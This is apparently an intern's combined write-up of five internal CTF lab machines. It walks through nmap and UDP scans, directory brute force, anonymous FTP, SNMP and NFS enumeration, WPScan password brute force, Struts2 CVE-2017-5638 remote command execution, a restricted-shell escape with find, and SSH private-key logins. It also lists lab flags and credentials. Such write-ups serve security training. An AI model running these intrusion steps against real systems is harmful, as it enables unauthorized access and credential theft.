CTF internal during internship 2023

# Capturex CTF Writeup Summary

This Markdown combines and summarizes the uploaded Capturex writeups into one cleaner note.

## 1. Capturex First CTF

**Target:** `192.168.8.92`

### Summary
The NBS machine involved basic web enumeration, directory discovery, credential recovery, database access, and SSH key usage.

### Steps
1. **Initial web check**
   - Visit the target web server.
   - Check `robots.txt`.

   ```text
   http://192.168.8.92/robots.txt
   ```

2. **Directory brute force**
   - Run `dirb` against the OpenVPN admin path.

   ```bash
   dirb http://192.168.8.92/openvpn-admin/
   ```

   - Interesting file found:

   ```text
   credential.bak
   ```

3. **phpMyAdmin access**
   - Browse to:

   ```text
   http://192.168.8.92/phpmyadmin/sql
   ```

   - Login using discovered database credentials.

4. **User directory enumeration**
   - Move up directories and inspect the `superadmin` home directory.

   ```bash
   cd ..
   cd superadmin
   cd .ssh
   ```

5. **SSH key testing**
   - Inside the `.ssh` directory, try available identity files to access root.

### Key Takeaway
This box focuses on enumeration discipline: check hidden web files, brute-force directories, recover credentials, then use exposed SSH keys for privilege escalation.

---

## 2. Capturex Oxygen

**Target:** `192.168.8.114`

### Summary
Oxygen exposed Apache Struts2 Showcase on port `8080`, vulnerable to **CVE-2017-5638** remote code execution.

### Steps
1. **Nmap scan**

   ```bash
   nmap -min-rate 5000 -Pn 192.168.8.114
   ```

   Open ports discovered:

   ```text
   22/tcp    open  ssh
   8080/tcp  open  http-proxy
   ```

2. **Web enumeration**
   - Visit:

   ```text
   http://192.168.8.114:8080/showcase.jsp
   ```

   - The page showed Apache Struts2 Showcase.

3. **Exploit research**
   - Search for Apache Struts2 Showcase exploit.
   - The vulnerable component was linked to:

   ```text
   CVE-2017-5638 - Apache Struts2 S2-045
   ```

4. **Command execution**
   - Use the exploit script and execute commands:

   ```bash
   python ex.py http://192.168.8.114:8080/showcase.jsp 'pwd'
   python ex.py http://192.168.8.114:8080/showcase.jsp 'id'
   ```

   Confirmed execution as root:

   ```text
   uid=0(root) gid=0(root) groups=0(root)
   ```

5. **Find and read flag**

   ```bash
   python ex.py http://192.168.8.114:8080/showcase.jsp 'find / -name flag.txt'
   python ex.py http://192.168.8.114:8080/showcase.jsp 'cat /var/secret/flag.txt'
   ```

### Flag
```text
flag{7f4b2162cc4d9d15ababf6c968380d}
```

### Key Takeaway
Always identify known vulnerable web frameworks. A public Struts2 Showcase instance is a strong sign to test known Struts RCE CVEs.

---

## 3. Capturex Hydrogen

**Target:** `192.168.8.118`  
**Domain:** `hydrogen.co`

### Summary
Hydrogen involved virtual host discovery, FTP anonymous login, WordPress enumeration, SSH login, restricted shell escape, and phpMyAdmin inspection.

### Flag 1 — FTP Anonymous Access

1. **Edit `/etc/hosts`**

   ```bash
   sudo nano /etc/hosts
   ```

   Add:

   ```text
   192.168.8.118 hydrogen.co
   ```

2. **Visit the website**
   - After adding the hostname, the 403 forbidden site became accessible.

3. **FTP login**

   ```bash
   ftp 192.168.8.118
   ```

   Credentials:

   ```text
   Username: anonymous
   Password: any email
   ```

4. **Download and read flag**

   ```bash
   ls
   get flag1.txt
   cat flag1.txt
   ```

### Flag 1
```text
a173c6cb236d6fe768ad94a6df400874
```

---

### Flag 2 — Locate Text Files

1. Search for text files:

   ```bash
   find / -type f -name "*.txt"
   ```

2. Interesting paths included:

   ```text
   /usr/share/nginx/www/wordpress/wp-includes/js/readme.txt
   /usr/share/nginx/www/wordpress/flag2.txt
   ```

3. Access the discovered file through the web path.

### Key Point
The `www` directory maps to the web root/subdomain path, so discovered files can sometimes be opened through the browser.

---

### Flag 3 — WordPress Brute Force

1. WordPress path was discovered:

   ```text
   http://hydrogen.co/wordpress/
   ```

2. Run WPScan:

   ```bash
   wpscan --url http://hydrogen.co/wordpress/ --enumerate --usernames john --passwords rockyou.txt
   ```

3. Valid credentials found:

   ```text
   Username: john
   Password: justin
   ```

4. SSH as john:

   ```bash
   ssh john@192.168.8.118
   ```

5. Read the flag in john's directory.

---

### Flag 4 — Restricted Shell Escape

The writeup used `find` to escape a restricted shell:

```bash
find . -exec /bin/sh \; -quit
```

Then moved to root and read the flag:

```bash
cd /
cd root
cat flag4.txt
```

### Flag 4
```text
flag{6d24904be52c92fad1c79fe0e22fff20}
```

---

### Flag 5 — phpMyAdmin / WordPress Database

1. Open phpMyAdmin:

```text
http://hydrogen.co/phpMyAdmin
```

2. Browse to the WordPress database.
3. Open the `wp_users` table.
4. Scroll right and inspect the `secret` field.

### Flag 5
```text
flag{a260f6e38bf3d9c83810eda005ceba3}
```

### Key Takeaway
Hydrogen chains common web misconfigurations: virtual host exposure, anonymous FTP, WordPress weak credentials, restricted shell escape, and database leakage.

---

## 4. Capturex Butane

**Target:** `192.168.8.131`

### Summary
Butane focused on UDP scanning and SNMP enumeration. SNMP leaked useful information, including a password and flags.

### Flag 1 — SNMP Enumeration

1. **UDP scan**

```bash
sudo nmap -sU --min-rate 5000 -p 1-65535 192.168.8.131
```

Discovered:

```text
161/udp open snmp
```

2. **SNMP walk**

```bash
snmpwalk -v 2c -c public 192.168.8.131
```

3. The SNMP output leaked a password and flag.

### Discovered Password
```text
Pa55w0RD
```

### Flag 1
```text
flag{0a5c95ab482147f235fc5ze196bf05bfd}
```

---

### Flag 2 — User Flag

After gaining access as user `mike`, list the home directory:

```bash
ls -la
cat flag2.txt
```

### Flag 2
```text
flag{37503d2ac009c25f88f6a4961be83d0944afcd6}
```

### Flag 3
The uploaded writeup only shows a heading for Flag 3 without enough solution details.

### Key Takeaway
SNMP is often forgotten during enumeration. Always scan UDP and test common community strings like `public`.

---

## 5. Capturex Napalm

**Target:** `192.168.8.90`

### Summary
Napalm involved NFS enumeration, mounting an exported share, reading a flag, extracting an SSH private key, and logging in as `superpoweradmin`.

### Flag 2 — NFS Share

1. **Nmap with NFS scripts**

```bash
nmap -Pn -sV --script=nfs* 192.168.8.90
```

Open services included:

```text
22/tcp    ssh
111/tcp   rpcbind
2049/tcp  nfs
```

The NFS export showed:

```text
/home/superpoweradmin 192.168.72.0/24 192.168.21.0/24
```

2. **Mount the NFS share**

```bash
sudo mkdir -p /mnt/nfs_share
sudo mount -t nfs 192.168.8.90:/home/superpoweradmin /mnt/nfs_share -o nolock
```

3. **Read flag**

```bash
cd /mnt/nfs_share
cat flag2.txt
```

### Flag 2
```text
flag{141a18f81cf9a847361f01f9b1d2860}
```

---

### Flag 1 — SSH Private Key Login

1. List hidden directories:

```bash
ls -la
```

2. Enter `.ssh` directory and locate `id_rsa`.

3. Login using the private key:

```bash
chmod 600 id_rsa
ssh -i id_rsa superpoweradmin@192.168.8.90
```

4. The SSH banner displayed Flag 1.

### Flag 1
```text
flag{2dbc2759d2eb78a8c9a9346ebab}
```

---

### Flag 3
Unable to solve

### Key Takeaway
Readable NFS exports can expose user home directories, SSH keys, and flags. Always check `showmount`, NFS scripts, and hidden folders like `.ssh`.

---

## Overall Methodology

Across all Capturex machines, the common workflow was:

1. **Reconnaissance**
   - Use `nmap` for TCP and UDP scanning.
   - Use `-Pn` when hosts do not respond to ping.
   - Use service scripts for protocols like NFS and SNMP.

2. **Web Enumeration**
   - Check hidden files such as `robots.txt`.
   - Use directory brute force tools like `dirb`.
   - Inspect source code and exposed web paths.

3. **Service Enumeration**
   - FTP anonymous login.
   - SNMP community string testing.
   - NFS export mounting.
   - WordPress enumeration with WPScan.

4. **Credential Reuse**
   - Use discovered passwords for SSH, phpMyAdmin, or WordPress.
   - Check database tables for secrets.

5. **Privilege Escalation**
   - Abuse exposed SSH keys.
   - Escape restricted shells.
   - Read sensitive files from mounted shares.

## Tools Used

```text
nmap
Dirb
ftp
wpscan
ssh
snmpwalk
showmount
mount
find
cat
phpMyAdmin
```

## Clean Command Reference

### Nmap TCP Scan
```bash
nmap -Pn -sV <target-ip>
```

### UDP Scan
```bash
sudo nmap -sU --min-rate 5000 -p 1-65535 <target-ip>
```

### Directory Brute Force
```bash
dirb http://<target-ip>/<path>/
```

### FTP Anonymous Login
```bash
ftp <target-ip>
```

### WPScan Brute Force
```bash
wpscan --url http://domain/wordpress/ --enumerate --usernames john --passwords rockyou.txt
```

### SNMP Walk
```bash
snmpwalk -v 2c -c public <target-ip>
```

### NFS Enumeration
```bash
nmap -Pn -sV --script=nfs* <target-ip>
showmount -e <target-ip>
```

### Mount NFS Share
```bash
sudo mkdir -p /mnt/nfs_share
sudo mount -t nfs <target-ip>:/path /mnt/nfs_share -o nolock
```

### SSH With Private Key
```bash
chmod 600 id_rsa
ssh -i id_rsa user@<target-ip>
```

---

## Final Notes

These Capturex writeups are mostly beginner-friendly boot-to-root style challenges. The strongest recurring lesson is simple: enumerate everything. TCP-only scanning is not enough; UDP services like SNMP and file-sharing services like NFS can directly expose credentials, keys, and flags.
